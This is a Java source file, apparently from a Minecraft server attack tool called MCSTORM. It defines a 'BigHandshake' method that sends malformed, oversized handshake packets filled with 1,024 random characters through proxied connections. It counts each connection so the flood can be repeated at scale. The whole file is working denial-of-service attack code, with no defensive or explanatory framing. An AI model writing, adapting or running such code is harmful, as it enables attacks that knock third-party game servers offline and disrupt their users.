package io.MCSTORM.methods;

import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.io.IOException;
import java.security.SecureRandom;

public class BigHandshake implements Method {
    private final SecureRandom r = new SecureRandom();
    private final int a = 1024;
    private String lol = "";

    public BigHandshake() {
        for (int i = 1; i < this.a + 1; i++) {
            this.lol = this.lol + (char) (this.r.nextInt(125) + 1);
        }
    }

    public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
        while ((paramInt & 0xFFFFFF80) != 0) {
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;
        }
        out.writeByte(paramInt);
    }

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream out = new ByteBufOutputStream(b);
        try {
            out.writeByte(1037);
            out.writeByte(0);
            out.writeBytes(this.lol);
            out.writeByte(9);
            out.writeBytes("localhost");
            out.writeShort(25565);
            out.writeByte(1);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        channel.writeAndFlush(b);
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();
    }
}